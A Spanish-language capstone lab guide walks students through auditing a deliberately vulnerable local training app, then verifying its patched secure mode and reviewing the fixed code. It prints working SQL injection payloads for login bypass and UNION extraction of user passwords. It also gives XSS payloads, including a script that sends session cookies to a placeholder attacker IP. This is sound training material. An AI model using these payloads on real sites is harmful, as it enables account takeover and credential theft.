# Laboratorio 08: Simulación de Auditoría Web Completa (Capstone Project)

## 🎯 Objetivo
Realizar una auditoría de seguridad integral (Pentest) a la plataforma CADEL Academy, simulando un encargo profesional real. Este laboratorio consolida todos los conocimientos previos en un único ejercicio de flujo continuo, desde el reconocimiento hasta la verificación de parches.

## 📋 Escenario
Has sido contratado como consultor de seguridad externo por la organización "Cadel Academy". Tu misión es identificar, explotar y documentar todas las vulnerabilidades presentes en su plataforma educativa antes de que sean descubiertas por actores maliciosos. Posteriormente, deberás verificar que las correcciones implementadas por el equipo de desarrollo sean efectivas.

## 📝 Alcance y Reglas (Rules of Engagement)
*   **Objetivo:** `http://localhost:8080` (Entorno Vulnerable) y `https://localhost:8443` (Entorno Seguro).
*   **Metodología:** OWASP Top 10.
*   **Limitaciones:** Prohibido realizar ataques de Denegación de Servicio (DoS), utilizar herramientas de escaneo automático agresivo que puedan degradar el servicio o realizar acciones que corrompan la integridad de los datos de forma permanente (ej. borrar usuarios o tablas).

---

## 🕵️ Fase 1: Reconocimiento y Mapeo (Information Gathering)

Antes de atacar, debes entender el objetivo.

1.  **Exploración Pasiva:**
    *   Navega por la aplicación como un usuario normal. Crea un mapa mental o un documento con las funcionalidades clave: Login, Registro, Buscador, Foro, Chat, Perfil, Blog.
    *   Utiliza las **Herramientas de Desarrollador del navegador (F12)**. En la pestaña "Red", inspecciona las cabeceras de las peticiones. Busca cabeceras como `Server` o `X-Powered-By` para identificar tecnologías.
    *   **Revisión de Código Fuente:** Haz clic derecho -> "Ver código fuente de la página" (Ctrl+U). Busca comentarios HTML (`<!-- ... -->`) que puedan revelar pistas o lógica oculta.
2.  **Exploración Activa:**
    *   **Tarea:** Completa el **LAB-07 (Reconocimiento)**.
    *   **Metodología:** Navega a `http://localhost:8080/robots.txt`. Este archivo a menudo revela rutas que los desarrolladores no quieren que los buscadores indexen, pero que son un tesoro para un auditor.
    *   **Acción:** Intenta acceder a las rutas que encuentres en `robots.txt`. ¿Qué información contienen?
    *   **Entregable:** Un documento simple con una lista de URLs interesantes, funcionalidades y tecnologías identificadas.

## 💥 Fase 2: Evaluación de Vulnerabilidades (Modo Vulnerable)

Activa el **Modo Vulnerable** (Puerto 8080). Tu objetivo es encontrar, explotar y documentar las siguientes vulnerabilidades.

### 2.1. Identificación y Autenticación (SQL Injection)
*   **Prueba:** Bypass de autenticación en el formulario de login.
*   **Vector:** Inyección SQL en el campo de usuario.
*   **Objetivo:** Acceder como `admin` sin conocer su contraseña.
*   **Guía:** Sigue los pasos del **LAB-01 (SQLi Login)**.
*   **Payload de ejemplo:** `admin' OR '1'='1' -- -`

### 2.2. Inyección SQL (Extracción de Datos)
*   **Prueba:** Extracción de datos sensibles de la base de datos mediante UNION.
*   **Vector:** Buscador del Chat (`/chat`).
*   **Objetivo:** Extraer la lista de usuarios y contraseñas de la tabla `users`.
*   **Guía:** Sigue la metodología del **LAB-02 (SQLi Chat)**.
*   **Payload de ejemplo:** `' UNION SELECT username, password FROM users -- -`

### 2.3. Cross-Site Scripting (XSS)
*   **Prueba (Reflected):** Verifica si el buscador principal (`/search`) refleja el input del usuario sin sanitizar.
    *   **Guía:** **LAB-03 (XSS Reflected)**.
    *   **Payload:** `<script>alert('XSS Reflected')</script>`
*   **Prueba (Stored):** Intenta persistir un script en el Foro o en tu Perfil que afecte a otros visitantes.
    *   **Objetivo:** Lograr que aparezca un `alert(document.cookie)` o `alert(document.domain)`.
    *   **Guía:** **LAB-04 (XSS Stored)**.
    *   **Payload:** `<img src=x onerror=alert(document.cookie)>`

### 2.3.1. XSS Avanzado: Redirección Maliciosa
*   **Objetivo:** Inyectar un script en el Foro que redirija a los visitantes a una web externa (ej. YouTube).
*   **Payload:** `<script>window.location="https://www.youtube.com"</script>`

### 2.3.2. XSS Avanzado: Exfiltración de Datos
*   **Objetivo:** Configurar un listener con `python3 -m http.server` y robar la cookie de sesión de un usuario que visite el Chat.
*   **Payload:** `<script>fetch('http://[TU_IP]:8000/?cookie='+document.cookie)</script>`

### 2.4. Carga de Archivos Sin Restricciones (RCE)
*   **Prueba:** Subir un archivo con contenido ejecutable en el lado del cliente.
*   **Vector:** Funcionalidad de adjuntar archivos en el Foro.
*   **Objetivo:** Lograr que el servidor almacene y sirva un archivo `.html` que ejecute JavaScript (HTML/JS o simulación de RCE) a través de un archivo adjunto.
*   **Guía:** Sigue las instrucciones del **LAB-05 (File Upload)**.

### 2.5. Fallos de Configuración de Seguridad (Cookies)
*   **Prueba:** Análisis de la seguridad de las cookies de sesión.
*   **Vector:** Inspección de los atributos de las cookies.
*   **Objetivo:** Determinar si la cookie de sesión es vulnerable a robo (falta de `HttpOnly`) o interceptación (falta de `Secure`).
*   **Guía:** Utiliza la consola y la pestaña "Aplicación" de las herramientas de desarrollador, como se describe en el **LAB-06 (Insecure Cookies)**.

---

## 🛡️ Fase 3: Verificación y Análisis de Código (Modo Seguro)

El cliente indica que ha aplicado parches de seguridad. Activa el **Modo Seguro** (Puerto 8443) y verifica.

1.  **Re-Testing (Pruebas de Regresión):**
    *   Documenta el resultado: ¿Bloqueado? ¿Sanitizado? ¿Error genérico?
    *   Ejecuta **exactamente los mismos Payloads** que funcionaron en la Fase 2.
    *   Documenta el resultado para cada uno: ¿El payload se muestra como texto inofensivo? ¿La aplicación devuelve un error genérico? ¿Se bloquea la subida del archivo?
2.  **Análisis de Caja Blanca (Code Review):**
    *   Este es el paso clave para demostrar una comprensión profunda. No basta con ver que no funciona, hay que entender **por qué**.
    *   Accede al código fuente del proyecto (`app/routes/`, `app/templates/`).
    *   Para cada vulnerabilidad, localiza el bloque `if get_security_level() == 'secure':`.
    *   **Entregable:** Explica técnicamente por qué el código ahora es seguro (ej. "Se usa `cursor.execute` con tuplas para parametrizar" o "Jinja2 escapa automáticamente el output").

    *   **Ejemplo para SQLi:** Abre `app/routes/login.py`. Compara el bloque `if get_security_level() == 'vulnerable':` (que usa f-strings) con el bloque `else:` (que usa consultas parametrizadas `cursor.execute(query, (username, password))`). Explica la diferencia.

    *   **Ejemplo para XSS:** Abre `app/templates/search.html`. Compara `{{ query | safe }}` (vulnerable) con `{{ query }}` (seguro). Explica cómo el escape automático de Jinja2 neutraliza el ataque.
    
    *   **Ejemplo para File Upload:** Abre `app/routes/forum.py`. Verifica cómo se valida la extensión del archivo y se usa `secure_filename` en el bloque seguro.

    *   **Entregable:** Para cada vulnerabilidad, identifica el fragmento de código exacto que implementa la solución y explica su funcionamiento.

---

## 📊 Fase 4: Informe Ejecutivo (Simulado)

Como paso final, redacta un borrador del informe técnico que entregarías al cliente. Puedes usar un simple archivo de texto o Markdown.

1.  **Nombre del Hallazgo:** (ej. SQL Injection en Login).
2.  **Severidad:** (Crítica/Alta/Media/Baja).
3.  **Prueba de Concepto (PoC):** El payload exacto usado.
4.  **Impacto:** ¿Qué puede hacer un atacante con esto?
5.  **Recomendación:** ¿Cómo se solucionó en el Modo Seguro?

Para cada vulnerabilidad encontrada en la Fase 2, crea una entrada con este formato:

```markdown
### 1. SQL Injection en Autenticación

*   **Severidad:** Crítica (CVSS: 9.8)
*   **Descripción:** El formulario de inicio de sesión es vulnerable a inyección SQL, permitiendo a un atacante eludir el mecanismo de autenticación y obtener acceso no autorizado a cuentas privilegiadas.
*   **Prueba de Concepto (PoC):**
    *   **Usuario:** `admin' OR '1'='1' -- -`
    *   **Contraseña:** (cualquier valor)
*   **Impacto:** Compromiso total de la cuenta de administrador, lo que conlleva al control total de la plataforma.
*   **Recomendación:** Implementar consultas parametrizadas para separar el código SQL de los datos del usuario, tal y como se ha verificado en el entorno seguro.
```

---

## 🏆 Criterios de Éxito
Has completado la auditoría si:
1.  Has obtenido acceso administrativo sin credenciales.
2.  Has extraído datos de la base de datos usando una inyección UNION.
3.  Has ejecutado JavaScript en el navegador de una víctima (simulada) mediante XSS Reflejado y Almacenado.
4.  Has verificado que **ninguno** de estos ataques funciona en el Modo Seguro y puedes explicar **por qué**, señalando el código fuente correcto.